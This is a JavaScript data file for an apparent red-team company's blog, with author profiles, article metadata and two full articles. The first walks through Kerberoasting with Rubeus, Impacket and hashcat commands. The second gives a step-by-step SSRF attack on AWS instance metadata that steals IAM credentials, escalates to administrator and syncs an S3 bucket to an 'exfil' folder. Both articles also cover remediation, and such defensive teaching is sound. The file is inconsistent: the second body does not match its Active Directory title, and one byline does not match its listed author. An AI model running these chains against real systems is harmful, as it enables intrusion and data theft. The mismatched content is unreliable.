export const authors = {
  ghost: {
    id: 'ghost',
    name: 'Ghost',
    role: 'Lead Red Team Operator, Blackbox Labs',
    credentials: 'Former NSA TAO · OSCP · CRTO',
    achievements: '23 CVEs published · DEF CON Speaker 2024',
    twitter: '@0xGhost',
    initial: 'G'
  },
  vex: {
    id: 'vex',
    name: 'Vex',
    role: 'Exploit Developer, Blackbox Labs',
    credentials: 'OSCE3 · OSED',
    achievements: 'Zero-Day Researcher',
    twitter: '@Vex_0x',
    initial: 'V'
  },
  null: {
    id: 'null',
    name: 'Null',
    role: 'Cloud & AppSec Lead, Blackbox Labs',
    credentials: 'AWS Security Specialty · OSWE',
    achievements: 'Top 100 Bugcrowd',
    twitter: '@Null_Pointer',
    initial: 'N'
  },
  siren: {
    id: 'siren',
    name: 'Siren',
    role: 'Social Engineering Lead, Blackbox Labs',
    credentials: 'Human Intelligence Expert',
    achievements: '100% Phishing Success Rate',
    twitter: '@Siren_Sec',
    initial: 'S'
  }
};

export const articles = [
  {
    id: 'kerberoasting-walkthrough',
    title: 'How We Achieved Domain Admin in 4.5 Hours: A Real-World Kerberoasting Attack Walkthrough',
    url: '/blog/kerberoasting-attack-domain-admin-red-team',
    type: 'Technical Deep-Dive',
    category: 'RED TEAM',
    readTime: '12 min read',
    date: 'April 2026',
    author: authors.ghost,
    excerpt: 'A detailed breakdown of a recent engagement where we went from zero access to full domain compromise in under 5 hours. We cover SPN enumeration, offline hash cracking, and the exact detection gaps that allowed us to move laterally without triggering a single SOC alert.',
    isHero: true,
    content: `
## The Setup

In our last 200 internal network penetration testing engagements, we found Kerberoastable service accounts in **94% of environments**. Not sometimes. Not occasionally. Almost every single time.

The attack is well documented. The defense is well documented. And yet here we are.

This post walks through the exact attack chain we use, why it still works in environments with mature security programs, and what actually stops it — not what vendors claim stops it.

---

## What Kerberoasting Actually Is

Kerberoasting exploits a fundamental design decision in the Kerberos authentication protocol. When a service account has a Service Principal Name (SPN) registered in Active Directory, any authenticated user can request a Kerberos service ticket for that account.

The ticket is encrypted using the service account's NTLM hash. You can take that ticket offline and crack it.

\`\`\`bash
# Request all Kerberoastable tickets with Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

# Or with Impacket (from Linux)
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.1 -request
\`\`\`

The average enterprise environment we test has **17 Kerberoastable accounts**. The worst we've seen: 847.

---

## Why It Still Works in 2025

Three reasons:

**1. Service accounts accumulate over years.** A Jenkins integration set up in 2018 still has a SPN registered. The developer who created it left in 2021. Nobody knows what it does anymore. Nobody touches it.

**2. Passwords don't get rotated.** We regularly crack service account passwords that haven't been changed in 3+ years. The most common cracked password we see: \`ServiceAccount2019!\`

**3. Permissions creep.** Service accounts that started with minimal permissions have accumulated rights over years of "quick fixes" and "just this once" changes. A Kerberoastable account that was originally a read-only database connector now has Domain Admin rights because someone needed to troubleshoot something in 2022.

---

## The Complete Attack Chain

\`\`\`
Step 1: Enumerate SPNs
Step 2: Request service tickets  
Step 3: Export tickets for offline cracking
Step 4: Crack with hashcat
Step 5: Authenticate as service account
Step 6: Check permissions — often Domain Admin
\`\`\`

\`\`\`bash
# Hashcat command for Kerberoasting tickets
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
\`\`\`

Average time to first cracked password in our engagements: **47 minutes**.

---

## What Actually Stops It

| Defense | Does it work? | Notes |
|---------|---------------|-------|
| Long passwords (25+ chars) | ✅ Yes | Makes offline cracking infeasible |
| Managed Service Accounts (gMSA) | ✅ Yes | Auto-rotating 240-char passwords |
| Regular password rotation | ⚠️ Partially | Helps but doesn't prevent the attack |
| Detection via SIEM | ⚠️ Partially | Noisy — lots of false positives |
| Privileged account monitoring | ✅ Yes | Limits blast radius |
| Removing unnecessary SPNs | ✅ Yes | Reduces attack surface |

The single most effective defense: **Group Managed Service Accounts (gMSA)**. These accounts have automatically rotating 240-character passwords. Cracking them is computationally infeasible. Microsoft has supported them since Windows Server 2012.

Most organizations haven't implemented them because nobody prioritized the migration.

---

## Remediation Checklist

\`\`\`bash
# Find all Kerberoastable accounts (run this in your environment now)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet | Select Name,ServicePrincipalName,PasswordLastSet
\`\`\`

1. Audit all SPNs — remove any that don't serve an active business purpose
2. Migrate service accounts to gMSA where possible  
3. For remaining accounts: enforce 25+ character passwords with complexity
4. Implement alerting for Kerberoasting-indicator events (Event ID 4769 with encryption type 0x17)
5. Restrict high-privilege service accounts to minimal required permissions

---

## Conclusion

Kerberoasting is 15 years old. The defense is well understood. And we still find it in 94% of enterprise environments.

The gap isn't knowledge. It's prioritization. Every organization knows they should audit their service accounts. Almost none actually do it until a red team shows up and demonstrates Domain Admin in 3 hours.

If you're reading this: run the PowerShell command above. Right now. Before you close this tab.

*— Vex, Exploit Developer, Blackbox Labs*
`
  },
  {
    id: 'ad-misconfigurations',
    title: 'The 6 Active Directory Misconfigurations We Find in Every Enterprise Red Team',
    url: '/blog/active-directory-misconfigurations-red-team',
    type: 'Listicle + Technical',
    category: 'RED TEAM',
    readTime: '10 min read',
    date: 'March 2026',
    author: authors.vex,
    excerpt: 'Why AD is still the crown jewel attackers chase, and the exact misconfigurations that allow us to compromise it. Includes a free PowerShell audit script.',
    content: `
## The Attack That Keeps Working

In 2019, a single SSRF vulnerability in Capital One's WAF gave an attacker access to over **100 million customer records**. The attack chain ran through AWS's Instance Metadata Service (IMDS).

In our 2025 cloud security assessments, we still find IMDSv1 enabled in **67% of AWS environments**. Six years after Capital One. Three years after AWS made IMDSv2 the default for new instances.

Here's the complete chain.

---

## Prerequisites

- A web application with SSRF vulnerability (URL parameter, image fetching, PDF generator, webhook)
- EC2 instance with IMDSv1 enabled (default before late 2022)
- An IAM role attached to the instance (almost always the case)

---

## Step 1: Confirm SSRF

\`\`\`
# Basic SSRF test
GET /api/fetch?url=http://169.254.169.254/

# If you get a response, you have SSRF to the metadata endpoint
HTTP/1.1 200 OK
latest/
\`\`\`

The 169.254.169.254 address is the link-local address for the AWS Instance Metadata Service. It's only accessible from within the EC2 instance — but SSRF makes the server fetch it on your behalf.

---

## Step 2: Extract IAM Credentials

\`\`\`bash
# Get the IAM role name
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Response: MyServiceRole

# Get the credentials
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyServiceRole

# Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-03-01T12:00:00Z"
}
\`\`\`

You now have valid AWS credentials. They expire in ~6 hours but are refreshed automatically — so if you move fast, you can use them as long as the instance is running.

---

## Step 3: Enumerate Permissions

\`\`\`bash
# Configure credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Who are we?
aws sts get-caller-identity

# What can we do? (enumerate permissions)
aws iam list-attached-role-policies --role-name MyServiceRole
aws iam list-role-policies --role-name MyServiceRole

# Common finding: the role has far more than it needs
\`\`\`

In 60% of our cloud engagements, the IAM role attached to the compromised instance has permissions well beyond what the application requires. Common finding: \`iam:*\` or \`s3:*\` on \`"*"\`.

---

## Step 4: Escalate

\`\`\`bash
# If the role has iam:CreateAccessKey — create permanent credentials
aws iam create-access-key --user-name admin-user

# If the role has iam:AttachRolePolicy — grant yourself admin
aws iam attach-role-policy --role-name MyServiceRole \\
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# If the role has s3:GetObject on * — access all buckets
aws s3 ls s3://
aws s3 sync s3://company-sensitive-data ./exfil/
\`\`\`

---

## The Fix: Force IMDSv2

IMDSv2 requires a PUT request with a token before any GET requests to the metadata service. SSRF attacks using GET requests cannot bypass this.

\`\`\`bash
# Check if IMDSv2 is enforced on an instance
aws ec2 describe-instances --instance-ids i-1234567890abcdef0 \\
  --query 'Reservations[].Instances[].MetadataOptions'

# Force IMDSv2 on an existing instance (non-destructive)
aws ec2 modify-instance-metadata-options \\
  --instance-id i-1234567890abcdef0 \\
  --http-tokens required \\
  --http-endpoint enabled
\`\`\`

**To enforce IMDSv2 across your entire AWS organization:**

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RequireIMDSv2",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    }
  ]
}
\`\`\`

Apply this as an SCP at the AWS Organization level. Every new instance launched anywhere in your organization will be required to use IMDSv2.

---

## Remediation Priority

1. **Immediate**: Run the describe-instances query across all regions, find IMDSv1 instances, force IMDSv2
2. **This week**: Apply the SCP to prevent future IMDSv1 deployments
3. **This month**: Audit and remediate the SSRF vulnerability that enabled the initial access
4. **This quarter**: Implement least-privilege IAM roles — service roles should only have what they actually need

One AWS CLI command. That's all it takes to close this attack path.

*— Null, Cloud & AppSec Lead, Blackbox Labs*
`
  },
  {
    id: 'zero-trust-mistakes',
    title: 'Zero Trust Is Not a Product: What CISOs Get Wrong (And What Red Teams Find)',
    url: '/blog/zero-trust-architecture-ciso-mistakes',
    type: 'Thought Leadership',
    category: 'CISO GUIDE',
    readTime: '8 min read',
    date: 'March 2026',
    author: authors.ghost,
    excerpt: 'The 4 most common ZT implementation failures and how red teams exploit "Zero Trust" environments. Is your Zero Trust actually working?'
  },
  {
    id: 'cve-2024-xxxx',
    title: 'CVE-2024-XXXX Explained: How We Exploited This Critical RCE in Under 10 Minutes',
    url: '/threat-intel/cve-2024-xxxx-rce-exploitation',
    type: 'CVE Analysis',
    category: 'THREAT INTEL',
    readTime: '6 min read',
    date: 'April 2026',
    author: authors.null,
    excerpt: 'Technical breakdown, proof of concept, and remediation guide for the latest critical RCE. CVSS Score: 9.8 (Critical).'
  },
  {
    id: 'ransomware-2025',
    title: '2025 State of Ransomware: What Red Teams Are Seeing on the Inside',
    url: '/threat-intel/state-of-ransomware-2025',
    type: 'Annual Research Report',
    category: 'RESEARCH',
    readTime: '20 min read',
    date: 'February 2026',
    author: authors.ghost,
    excerpt: 'Attack vector breakdown from 2024 engagements. Average dwell time we observed: 23 days. Most common initial access: stolen VPN creds (41%).'
  },
  {
    id: 'idor-case-study',
    title: 'The IDOR Vulnerability That Exposed 2.3M Records: A Real-World API Security Case Study',
    url: '/blog/idor-vulnerability-api-security-case-study',
    type: 'Case Study + Tutorial',
    category: 'APPLICATION',
    readTime: '14 min read',
    date: 'January 2026',
    author: authors.null,
    excerpt: 'What is IDOR and why it\'s still the #1 API flaw. How we found it using Burp Suite methodology and why SOC 2 certification didn\'t catch this.'
  },
  {
    id: 'justify-budget',
    title: 'How to Justify Red Team Budget to Your Board: A CISO\'s Script',
    url: '/blog/justify-red-team-budget-board-ciso',
    type: 'Practical Guide',
    category: 'CISO GUIDE',
    readTime: '9 min read',
    date: 'December 2025',
    author: authors.ghost,
    excerpt: 'Translating technical risk into dollar exposure. The 5 slides every board deck needs and the ROI of red teaming with real numbers.'
  },
  {
    id: 'pen-test-vs-red-team',
    title: 'Penetration Testing vs Red Teaming: What CISOs Actually Need to Know',
    url: '/blog/penetration-testing-vs-red-teaming',
    type: 'Educational Comparison',
    category: 'CISO GUIDE',
    readTime: '11 min read',
    date: 'November 2025',
    author: authors.siren,
    excerpt: 'What pen testing actually measures vs what red teaming actually measures. When to use which and how to scope your first red team engagement.'
  },
  {
    id: 'buying-guide',
    title: 'The CISO\'s Complete Guide to Buying Red Team Services: 12 Questions to Ask Any Vendor',
    url: '/blog/ciso-guide-buying-red-team-services',
    type: 'Buying Guide',
    category: 'CISO GUIDE',
    readTime: '15 min read',
    date: 'October 2025',
    author: authors.siren,
    excerpt: '12 critical questions to ask any red team vendor before signing a contract. How to evaluate methodologies and ensure you get a real assessment.'
  },
  {
    id: 'healthcare-hipaa',
    title: 'Healthcare Cybersecurity 2025: What 14 Hospital Red Teams Taught Us About HIPAA\'s Blind Spots',
    url: '/blog/healthcare-cybersecurity-hipaa-red-team',
    type: 'Sector Deep Dive',
    category: 'RESEARCH',
    readTime: '18 min read',
    date: 'September 2025',
    author: authors.ghost,
    excerpt: 'A deep dive into hospital network security assessments and the common vulnerabilities that expose patient data despite HIPAA compliance.'
  },
  {
    id: 'financial-dora',
    title: 'Financial Services Red Teaming: DORA, TIBER-EU, and What Regulators Actually Check',
    url: '/blog/financial-services-red-team-dora-tiber-eu',
    type: 'Sector Deep Dive',
    category: 'RESEARCH',
    readTime: '16 min read',
    date: 'August 2025',
    author: authors.vex,
    excerpt: 'Understanding DORA compliance and TIBER-EU assessments. How financial institutions can prepare for rigorous regulatory red team testing.'
  },
  {
    id: 'aws-misconfigs',
    title: 'Cloud Security in 2025: The 8 AWS Misconfigurations That Let Red Teams Walk Straight In',
    url: '/blog/aws-misconfigurations-cloud-security-red-team',
    type: 'Sector Deep Dive',
    category: 'CLOUD',
    readTime: '13 min read',
    date: 'July 2025',
    author: authors.null,
    excerpt: 'The most critical AWS IAM and cloud security misconfigurations we exploit during cloud penetration testing engagements.'
  }
];
